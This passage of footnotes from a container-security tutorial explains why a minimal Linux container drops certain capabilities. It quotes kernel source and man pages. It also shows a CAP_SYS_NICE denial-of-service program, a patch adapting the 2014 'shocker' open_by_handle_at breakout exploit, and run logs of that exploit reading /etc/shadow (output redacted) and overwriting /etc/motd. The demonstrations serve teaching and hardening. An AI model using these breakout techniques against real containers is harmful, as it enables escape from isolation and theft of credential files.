	if (flags &amp; ~(MODULE_INIT_IGNORE_MODVERSIONS
		      |MODULE_INIT_IGNORE_VERMAGIC))
		return -EINVAL;

	err = kernel_read_file_from_fd(fd, &amp;hdr, &amp;size, INT_MAX,
				       READING_MODULE);
	if (err)
		return err;
	info.hdr = hdr;
	info.len = size;

	return load_module(&amp;info, uargs, flags);
}
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.23" class="footnum" href="#fnr.23">23</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 63: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/kmod.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n630"><code>kernel/kmod.c:630@c8d2bc</code></a></label><pre class="src src-C">static int proc_cap_handler(struct ctl_table *table, int write,
			 void __user *buffer, size_t *lenp, loff_t *ppos)
{
	struct ctl_table t;
	unsigned long cap_array[_KERNEL_CAPABILITY_U32S];
	kernel_cap_t new_cap;
	int err, i;

	if (write &amp;&amp; (!capable(CAP_SETPCAP) ||
		      !capable(CAP_SYS_MODULE)))
		return -EPERM;

	[...]
}
</pre>
</div>

<p class="footpara">
which is used to authorize requests to load modules.
</p></div></div>

<div class="footdef"><sup><a id="fn.24" class="footnum" href="#fnr.24">24</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 64: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/net/core/dev_ioctl.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n349"><code>net/core/dev_ioctl.c:349@c8d2bc</code></a></label><pre class="src src-C">/**
 *	dev_load	- load a network module
 *	@net: the applicable net namespace
 *	@name: name of interface
 *
 *	If a network interface is not present and the process has suitable
 *	privileges this function loads the module. If module loading is not
 *	available in this kernel then it becomes a nop.
 */

void dev_load(struct net *net, const char *name)
{
	struct net_device *dev;
	int no_module;

	rcu_read_lock();
	dev = dev_get_by_name_rcu(net, name);
	rcu_read_unlock();

	no_module = !dev;
	if (no_module &amp;&amp; capable(CAP_NET_ADMIN))
		no_module = request_module("netdev-%s", name);
	if (no_module &amp;&amp; capable(CAP_SYS_MODULE))
		request_module("%s", name);
}
</pre>
</div>

<p class="footpara">
This also allows processes with only <code>CAP_NET_ADMIN</code> to load <code>netdev-*</code> modules, and
is run on almost every <code>ioctl</code> on a network device:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 65: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/net/core/dev_ioctl.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n381"><code>net/core/dev_ioctl.c:381@c8d2bc</code></a></label><pre class="src src-C">/**
 *	dev_ioctl	-	network device ioctl
 *	@net: the applicable net namespace
 *	@cmd: command to issue
 *	@arg: pointer to a struct ifreq in user space
 *
 *	Issue ioctl functions to devices. This is normally called by the
 *	user space syscall interfaces but can sometimes be useful for
 *	other purposes. The return value is the return from the syscall if
 *	positive or a negative errno code on error.
 */

int dev_ioctl(struct net *net, unsigned int cmd, void __user *arg)
{
	[...]
	/*
	 *	See which interface the caller is talking about.
	 */

	switch (cmd) {
	/*
	 *	These ioctl calls:
	 *	- can be done by all.
	 *	- atomic and do not require locking.
	 *	- return a value
	 */
	case SIOCGIFFLAGS:
	case SIOCGIFMETRIC:
	case SIOCGIFMTU:
	case SIOCGIFHWADDR:
	case SIOCGIFSLAVE:
	case SIOCGIFMAP:
	case SIOCGIFINDEX:
	case SIOCGIFTXQLEN:
		dev_load(net, ifr.ifr_name);
		[...]
}
</pre>
</div>

<p class="footpara">
This was pretty surprising to me! I should look into this further.
</p></div></div>

<div class="footdef"><sup><a id="fn.25" class="footnum" href="#fnr.25">25</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 67: </span><a href="http://man7.org/linux/man-pages/man2/nice.2.html"><code>man 2 nice</code></a></label><pre class="src src-text">DESCRIPTION
	nice() adds inc  to the nice value for  the calling process.
	(A  higher  nice value  means  a  low priority.)   Only  the
	superuser  may specify  a  negative  increment, or  priority
	increase.
	[...]

ERRORS

	EPERM
		The calling process attempted  to increase its priority
		by  supplying  a  negative  inc  but  has  insufficient
		privileges.  Under  Linux, the  CAP_SYS_NICE capability
		is   required.   (But   see  the   discussion  of   the
		RLIMIT_NICE resource limit in setrlimit(2).)

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.26" class="footnum" href="#fnr.26">26</a></sup> <div class="footpara"><p class="footpara">
We'll see how many CPU cycles this gets in a single-core virtual
machine, in the host and in a container that can set low nice values:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 68: </span><code>busy_loop.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static busy_loop.c -o busy_loop" -*- */
#include &lt;time.h&gt;
#include &lt;sys/times.h&gt;
#include &lt;stdio.h&gt;

int main (int argc, char  **argv)
{
	struct timespec now = {0};
	struct timespec then = {0};
	clock_gettime(CLOCK_MONOTONIC, &amp;then);
	do {
		clock_gettime(CLOCK_MONOTONIC, &amp;now);
	} while ((now.tv_sec - then.tv_sec) * 5e9
		 + now.tv_nsec - then.tv_nsec &lt; 20e9);
	/* how much cpu time did we get? */
	struct tms tms = {0};
	if (times(&amp;tms) == -1) {
		fprintf(stderr, "++ times failed: %m\n");
		return 1;
	}
	/*  "The tms_utime field contains the CPU time spent executing
	    instructions of the calling process.  The tms_stime field contains the
	    CPU time spent in the system while executing tasks on behalf of the
	    calling process." */
	printf("ticks: %lu\n", tms.tms_utime + tms.tms_stime);
	return 0;
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 69: </span><code>nice_dos.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static nice_dos.c -o nice_dos" -*- */
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;

int main (int argc, char **argv)
{
	if (nice(-10) == -1) {
		fprintf(stderr, "++ nice failed: %m\n");
		return 1;
	}
	if (execve("./busy_loop", (char *[]) { "./busy_loop", 0 }, NULL)) {
		fprintf(stderr, "++ execve failed: %m\n");
		return 1;
	}
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 70: </span><code>allow_capsysnice.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..4895071 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -44,7 +44,6 @@ int capabilities()
 		CAP_SYS_ADMIN,
 		CAP_SYS_BOOT,
 		CAP_SYS_MODULE,
-		CAP_SYS_NICE,
 		CAP_SYS_RAWIO,
 		CAP_SYS_RESOURCE,
 		CAP_SYS_TIME,
</pre>
</div>

<pre class="example">
alpine-kernel-dev:~# (./busy_loop &amp;&amp; echo '^ uncontained one' &amp;) &amp;&amp; (sudo ./contained.allow_capsysnice -m . -u 0 -c ./nice_dos &amp;)
=&gt; validating Linux version...4.7.6.
=&gt; setting cgroups...memory...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.elKMci...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
ticks: 52
^ uncontained one
ticks: 341
=&gt; cleaning cgroups...done.
alpine-kernel-dev:~#
</pre></div></div>

<div class="footdef"><sup><a id="fn.27" class="footnum" href="#fnr.27">27</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 72: </span><a href="http://man7.org/linux/man-pages/man7/capabilities.7.html"><code>man 7 capabilities</code></a></label><pre class="src src-text">	CAP_SYS_RAWIO
		* Perform I/O port operations (iopl(2) and ioperm(2));
		* access /proc/kcore;
		* employ the FIBMAP ioctl(2) operation;
		* open   devices  for   accessing  x86   model-specific
		  registers (MSRs, see msr(4))
		* update /proc/sys/vm/mmap_min_addr;
		* create memory  mappings at addresses below  the value
		  specified by /proc/sys/vm/mmap_min_addr;
		* map files in /proc/bus/pci;
		* open /dev/mem and /dev/kmem;
		* perform various SCSI device commands;
		* perform  certain operations  on hpsa(4)  and cciss(4)
		  devices;
		* perform  a  range  of device-specific  operations  on
		  other devices.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.28" class="footnum" href="#fnr.28">28</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 73: </span><a href="http://man7.org/linux/man-pages/man4/mem.4.html"><code>man 4 mem</code></a></label><pre class="src src-text">	/dev/mem is a character device file  that is an image of the
	main memory of  the computer.  It may be  used, for example,
	to examine (and even patch) the system.

	[...]

	It is typically created by:

		mknod -m 660 /dev/mem c 1 1
		chown root:kmem /dev/mem

	The file /dev/kmem is the  same as /dev/mem, except that the
	kernel  virtual  memory  rather   than  physical  memory  is
	accessed.  Since  Linux 2.6.26, this file  is available only
	if  the   CONFIG_DEVKMEM  kernel  configuration   option  is
	enabled.

	It is typically created by:

		mknod -m 640 /dev/kmem c 1 2
		chown root:kmem /dev/kmem

	/dev/port  is similar  to /dev/mem,  but the  I/O ports  are
	accessed.

	It is typically created by:

		mknod -m 660 /dev/port c 1 4
		chown root:kmem /dev/port

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.29" class="footnum" href="#fnr.29">29</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 74: </span><a href="http://man7.org/linux/man-pages/man2/ioperm.2.html"><code>man 2 ioperm</code></a></label><pre class="src src-text">	ioperm()  sets  the  port  access permission  bits  for  the
	calling thread for num bits starting from port address from.
	If  turn_on is  nonzero, then  permission for  the specified
	bits is  enabled; otherwise it  is disabled.  If  turn_on is
	nonzero,   the    calling   thread   must    be   privileged
	(CAP_SYS_RAWIO).

</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 75: </span><a href="http://man7.org/linux/man-pages/man2/iopl.2.html"><code>man 2 iopl</code></a></label><pre class="src src-text">	iopl()  changes  the  I/O  privilege level  of  the  calling
	process, as specified  by the two least  significant bits in
	level.

	This call is necessary to allow 8514-compatible X servers to
	run under  Linux.  Since these  X servers require  access to
	all 65536 I/O ports, the ioperm(2) call is not sufficient.

	In  addition  to  granting  unrestricted  I/O  port  access,
	running  at a  higher I/O  privilege level  also allows  the
	process to disable interrupts.  This will probably crash the
	system, and is not recommended.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.30" class="footnum" href="#fnr.30">30</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 77: </span><a href="http://man7.org/linux/man-pages/man7/capabilities.7.html"><code>man 7 capabilities</code></a></label><pre class="src src-text">	CAP_SYS_RESOURCE
		* Use reserved space on ext2 filesystems;
		* make ioctl(2) calls controlling ext3 journaling;
		* override disk quota limits;
		* increase resource limits (see setrlimit(2));
		* override RLIMIT_NPROC resource limit;
		* override  maximum  number   of  consoles  on  console
		  allocation;
		* override maximum number of keymaps;
		* allow more  than 64hz  interrupts from  the real-time
		  clock;
		* raise msg_qbytes  limit for a System  V message queue
		  above  the  limit   in  /proc/sys/kernel/msgmnb  (see
		  msgop(2) and msgctl(2));
		* override  the  /proc/sys/fs/pipe-size-max limit  when
		  setting the capacity of a pipe using the F_SETPIPE_SZ
		  fcntl(2) command.
		* use F_SETPIPE_SZ  to increase the capacity  of a pipe
		  above       the        limit       specified       by
		  /proc/sys/fs/pipe-max-size;
		* override  /proc/sys/fs/mqueue/queues_max  limit  when
		  creating POSIX message queues (see mq_overview(7));
		* employ prctl(2) PR_SET_MM operation;
		* set /proc/PID/oom_score_adj to a value lower than the
		  value last set by a process with CAP_SYS_RESOURCE.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.31" class="footnum" href="#fnr.31">31</a></sup> <div class="footpara"><p class="footpara">
<a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522">Brad Spengler agreees in "False Boundaries and Arbitrary Code Execution":</a>
</p>

<blockquote>
<p>
No transitions known (to this author, yet):
[&#x2026;]
CAP_SYS_RESOURCE
[&#x2026;]
</p>
</blockquote></div></div>

<div class="footdef"><sup><a id="fn.32" class="footnum" href="#fnr.32">32</a></sup> <div class="footpara"><p class="footpara">
It turns out that you can break important things by altering the
time. <a href="https://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper_dowling.pdf">"Authenticated Network Time Synchronization"</a> describes some of
these:
</p>

<blockquote>
<p>
The importance of accurate time for security. There are many
examples of security mechanisms which (often implicitly) rely on
having an accurate clock:
</p>

<ul class="org-ul">
<li>Certificate validation in TLS and other protocols.  Validating a
public key certificate requires confirming that the current time
is within the certificateâ€™s validity period. Performing validation
with a slow or inaccurate clock may cause expired certificates to
be accepted as valid. A revoked certificate may also validate if
the clock is slow, since the relying party will not check for
updated revocation information.</li>

<li>Ticket verification in Kerberos. In Kerberos, authentication
tickets have a validity period, and proper verification requires
an accurate clock to prevent authentication with an expired
ticket.</li>

<li>HTTP Strict Transport Security (HSTS) policy duration. HSTS allows
website administrators to protect against downgrade attacks from
HTTPS to HTTP by sending a header to browsers indicating that
HTTPS must be used instead of HTTP. HSTS policies specify the
duration of time that HTTPS must be used. If the browserâ€™s clock
jumps ahead, the policy may expire re-allowing downgrade attacks.
A related mechanism, HTTP Public Key Pinning also relies on
accurate client time for security.</li>
</ul>

<p>
For clients who set their clocks using NTP, these security
mechanisms (and others) can be attacked by a network-level attacker
who can intercept and modify NTP traffic, such as a malicious
wireless access point or an insider at an ISP. In practice, most NTP
servers do not authenticate themselves to clients, so a network
attacker can intercept responses and set the timestamps arbitrarily.
Even if the client sends requests to multiple servers, these may all
be intercepted by an upstream network device and modified to present
a consistently incorrect time to a victim. Such an attack on HSTS
was demonstrated by <a href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Selvi-Bypassing-HTTP-Strict-Transport-Security-wp.pdf">Selvi</a>, who provided a tool to advance the clock
of victims in order to expire HSTS policies. <a href="http://www.cs.bu.edu/~goldbe/NTPattack.html">Malhotra et al</a>.
present a variety of attacks that rely on NTP being unauthenticated,
further emphasizing the need for authenticated time synchronization.
</p>
</blockquote></div></div>

<div class="footdef"><sup><a id="fn.33" class="footnum" href="#fnr.33">33</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 80: </span><a href="http://man7.org/linux/man-pages/man7/capabilities.7.html"><code>man 7 capabilities</code></a></label><pre class="src src-text">       CAP_WAKE_ALARM (since Linux 3.0)
	      Trigger something that will wake up the system (set
	      CLOCK_REALTIME_ALARM and CLOCK_BOOTTIME_ALARM timers).
</pre>
</div>

<p class="footpara">
I had trouble finding more information about these, but <a href="https://lwn.net/Articles/429925/">"Waking
systems from suspend" on LWN</a> goes into more detail:
</p>

<blockquote>
<p>
these timers are exposed to user space via the standard POSIX
clocks and timers interface, using the new the
CLOCK_REALTIME_ALARM clockid. The new clockid behaves identically
to CLOCK_REALTIME except that timers set against the _ALARM
clockid will wake the system if it is suspended.
</p>
</blockquote></div></div>

<div class="footdef"><sup><a id="fn.34" class="footnum" href="#fnr.34">34</a></sup> <div class="footpara"><p class="footpara">
<a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522">Brad Spengler's "False Boundaries and Arbitrary Code Execution"</a>:
</p>
<blockquote>
<p>
CAP_DAC_OVERRIDE: generic: same bypass as CAP_DAC_READ_SEARCH, can
also modify a non-suid binary executed by root to execute code
with full privileges (modifying a suid root binary for you to
execute would require CAP_FSETID, as the setuid bit is cleared on
modification otherwise; thanks to Eric Paris). The modprobe sysctl
can be modified as mentioned above to execute code with full
capabilities.
</p>
</blockquote>
<p class="footpara">
and of course <a href="http://www.openwall.com/lists/oss-security/2014/06/18/4">Sebastian Krahmer's email</a>:
</p>

<blockquote>
<p>
In 0.11 the problem is that the apps that run in the container
have CAP_DAC_READ_SEARCH and CAP_DAC_OVERRIDE which allows the
containered app to access files not just by pathname (which would be
impossible due to the bind mount of the rootfs) but also by handles via
open_by_handle_at().
</p>
</blockquote>

<p class="footpara">
He might mean that the combination of both of them is problematic,
though, which is absolutely true: with <code>CAP_DAC_OVERRIDE</code> and
<code>CAP_DAC_READ_SEARCH</code>, it's possible to modify arbitrary files:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 83: </span><code>shocker_write.patch</code></label><pre class="src src-diff">48a49,50
&gt; char new_motd[] = "The tea from 2014 kicks your sekurity again\n";
&gt; 
149d150
&lt; 	char buf[0x1000];
161,163c162
&lt; 	       "[***] forward to my friends who drink secury-tea too!      [***]\n\n&lt;enter&gt;\n");
&lt; 
&lt; 	read(0, buf, 1);
---
&gt; 	       "[***] forward to my friends who drink secury-tea too!      [***]\n");
169c168
&lt; 	if (find_handle(fd1, "/etc/shadow", &amp;root_h, &amp;h) &lt;= 0)
---
&gt; 	if (find_handle(fd1, "/etc/motd", &amp;root_h, &amp;h) &lt;= 0)
175c174
&lt; 	if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&amp;h, O_RDONLY)) &lt; 0)
---
&gt; 	if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&amp;h, O_WRONLY)) &lt; 0)
178,180c177,179
&lt; 	memset(buf, 0, sizeof(buf));
&lt; 	if (read(fd2, buf, sizeof(buf) - 1) &lt; 0)
&lt; 		die("[-] read");
---
&gt; 	if (write(fd2, new_motd, sizeof(new_motd)) != sizeof(new_motd))
&gt; 		die("[-] write");
&gt; 
182c181
&lt; 	fprintf(stderr, "[!] Win! /etc/shadow output follows:\n%s\n", buf);
---
&gt; 	fprintf(stderr, "[!] Win! /etc/motd written.\n");
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 84: </span><code>allow_capdacreadsearch.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..c0cabcc 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -33,7 +33,6 @@ int capabilities()
 		CAP_AUDIT_READ,
 		CAP_AUDIT_WRITE,
 		CAP_BLOCK_SUSPEND,
-		CAP_DAC_READ_SEARCH,
 		CAP_FSETID,
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capdacreadsearch -m . -u 0 -c ./shocker_write
=&gt; validating Linux version...4.8.4-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.axVxAE...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]
[*] Resolving 'etc/motd'
[*] Found .
[*] Found ..
[*] Found lib64
[*] Found sys
[*] Found run
[*] Found sbin
[*] Found opt
[*] Found tmp
[*] Found lost+found
[*] Found dev
[*] Found mnt
[*] Found root
[*] Found lib
[*] Found boot
[*] Found home
[*] Found usr
[*] Found bin
[*] Found srv
[*] Found etc
[+] Match: etc ino=4325377
[*] Brute forcing remaining 32bit. This can take a while...
[*] (etc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x01, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'motd'
[*] Found binfmt.d
[*] Found ts.conf
[*] Found nscd.conf
[*] Found dhcpcd.duid
[*] Found sensors3.conf
[*] Found libao.conf
[*] Found .
[*] Found motd
[+] Match: motd ino=4325389
[*] Brute forcing remaining 32bit. This can take a while...
[*] (motd) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x0d, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x0d, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/motd written.
=&gt; cleaning cgroups...done.
</pre></div></div>

<div class="footdef"><sup><a id="fn.35" class="footnum" href="#fnr.35">35</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 85: </span><code>allow_capdacreadsearch.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..c0cabcc 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -33,7 +33,6 @@ int capabilities()
 		CAP_AUDIT_READ,
 		CAP_AUDIT_WRITE,
 		CAP_BLOCK_SUSPEND,
-		CAP_DAC_READ_SEARCH,
 		CAP_FSETID,
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 86: </span><code>allow_capdacreadsearch.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..c0cabcc 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -33,7 +33,6 @@ int capabilities()
 		CAP_AUDIT_READ,
 		CAP_AUDIT_WRITE,
 		CAP_BLOCK_SUSPEND,
-		CAP_DAC_READ_SEARCH,
 		CAP_FSETID,
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$sudo ./contained -m . -u 0 -c ./shocker
=&gt; validating Linux version...4.8.4-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.bWoGr4...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

&lt;enter&gt;

[*] Resolving 'etc/shadow'
[-] open_by_handle_at: Operation not permitted
=&gt; cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capdacreadsearch -m . -u 0 -c ./shocker
=&gt; validating Linux version...4.8.4-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.Jto0pj...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

&lt;enter&gt;

[*] Resolving 'etc/shadow'
[*] Found .
[*] Found ..
[*] Found lib64
[*] Found sys
[*] Found run
[*] Found sbin
[*] Found opt
[*] Found tmp
[*] Found lost+found
[*] Found dev
[*] Found mnt
[*] Found root
[*] Found lib
[*] Found boot
[*] Found home
[*] Found usr
[*] Found bin
[*] Found srv
[*] Found etc
[+] Match: etc ino=4325377
[*] Brute forcing remaining 32bit. This can take a while...
[*] (etc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x01, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'shadow'
[*] Found binfmt.d
[*] Found ts.conf
[*] Found nscd.conf
[*] Found dhcpcd.duid
[*] Found sensors3.conf
[*] Found libao.conf
[*] Found .
[*] Found motd
[*] Found gdb
[*] Found ..
[*] Found qemu
[*] Found lirc
[*] Found healthd.conf
[*] Found subuid
[*] Found locale.gen.pacnew
[*] Found gtk-3.0
[*] Found idn.conf
[*] Found wgetrc
[*] Found mime.types
[*] Found texmf
[*] Found request-key.conf
[*] Found xinetd.d
[*] Found ssl
[*] Found ifplugd
[*] Found mpd.conf
[*] Found gimp
[*] Found logrotate.d
[*] Found dhcpcd.conf
[*] Found trusted-key.key
[*] Found resolv.conf
[*] Found gemrc
[*] Found libpaper.d
[*] Found hostname
[*] Found kernel
[*] Found audit
[*] Found request-key.d
[*] Found subgid
[*] Found services
[*] Found protocols
[*] Found profile.d
[*] Found Muttrc.dist
[*] Found audisp
[*] Found default
[*] Found resolv.conf.bak
[*] Found ufw
[*] Found man_db.conf
[*] Found gconf
[*] Found geoclue
[*] Found netconfig
[*] Found nanorc
[*] Found environment
[*] Found crypttab
[*] Found brltty.conf
[*] Found logrotate.conf
[*] Found goaccess.conf
[*] Found nsswitch.conf
[*] Found shadow
[+] Match: shadow ino=4334485
[*] Brute forcing remaining 32bit. This can take a while...
[*] (shadow) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x95, 0x23, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x95, 0x23, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/shadow output follows:
[redacted]
=&gt; cleaning cgroups...done.
</pre></div></div>

<div class="footdef"><sup><a id="fn.36" class="footnum" href="#fnr.36">36</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 87: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/fs/namei.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n316"><code>fs/namei.c:316@c8d2bc</code></a>:</label><pre class="src src-C">int generic_permission(struct inode *inode, int mask)
{
	int ret;

	/*
	 * Do the basic permission checks.
	 */
	ret = acl_permission_check(inode, mask);
	if (ret != -EACCES)
		return ret;

	if (S_ISDIR(inode-&gt;i_mode)) {
		/* DACs are overridable for directories */
		if (capable_wrt_inode_uidgid(inode, CAP_DAC_OVERRIDE))
			return 0;
		if (!(mask &amp; MAY_WRITE))
			if (capable_wrt_inode_uidgid(inode,
						     CAP_DAC_READ_SEARCH))
				return 0;
		return -EACCES;
	}
	/*
	 * Read/write DACs are always overridable.
	 * Executable DACs are overridable when there is
	 * at least one exec bit set.
	 */
	if (!(mask &amp; MAY_EXEC) || (inode-&gt;i_mode &amp; S_IXUGO))
		if (capable_wrt_inode_uidgid(inode, CAP_DAC_OVERRIDE))
			return 0;

	/*
	 * Searching includes executable on directories, else just read.
	 */
	mask &amp;= MAY_READ | MAY_WRITE | MAY_EXEC;
	if (mask == MAY_READ)
		if (capable_wrt_inode_uidgid(inode, CAP_DAC_READ_SEARCH))
			return 0;

	return -EACCES;
}
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.37" class="footnum" href="#fnr.37">37</a></sup> <div class="footpara"><p class="footpara">
<a href="http://man7.org/linux/man-pages/man5/acct.5.html"><code>man 5 acct</code></a> gives more useful information about this system than <a href="http://man7.org/linux/man-pages/man2/acct.2.html"><code>man
2 acct</code></a>.
</p></div></div>

<div class="footdef"><sup><a id="fn.38" class="footnum" href="#fnr.38">38</a></sup> <div class="footpara"><p class="footpara">
<code>CAP_IPC_OWNER</code> is only used in <code>ipcperms</code>:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 88: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/util.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n468"><code>ipc/util.c:468@c8d2bc</code></a></label><pre class="src src-C">/**
 * ipcperms - check ipc permissions
 * @ns: ipc namespace
 * @ipcp: ipc permission set
 * @flag: desired permission set
 *
 * Check user, group, other permissions for access
 * to ipc resources. return 0 if allowed
 *
 * @flag will most probably be 0 or S_...UGO from &lt;linux/stat.h&gt;
 */
int ipcperms(struct ipc_namespace *ns, struct kern_ipc_perm *ipcp, short flag)
{
	kuid_t euid = current_euid();
	int requested_mode, granted_mode;

	audit_ipc_obj(ipcp);
	requested_mode = (flag &gt;&gt; 6) | (flag &gt;&gt; 3) | flag;
	granted_mode = ipcp-&gt;mode;
	if (uid_eq(euid, ipcp-&gt;cuid) ||
	    uid_eq(euid, ipcp-&gt;uid))
		granted_mode &gt;&gt;= 6;
	else if (in_group_p(ipcp-&gt;cgid) || in_group_p(ipcp-&gt;gid))
		granted_mode &gt;&gt;= 3;
	/* is there some bit set in requested_mode but not in granted_mode? */
	if ((requested_mode &amp; ~granted_mode &amp; 0007) &amp;&amp;
	    !ns_capable(ns-&gt;user_ns, CAP_IPC_OWNER))
		return -1;

	return security_ipc_permission(ipcp, flag);
}
</pre>
</div>

<p class="footpara">
It's used in the following places immediately after looking up the IPC
object in the IPC namespace:
</p>

<ul class="org-ul">
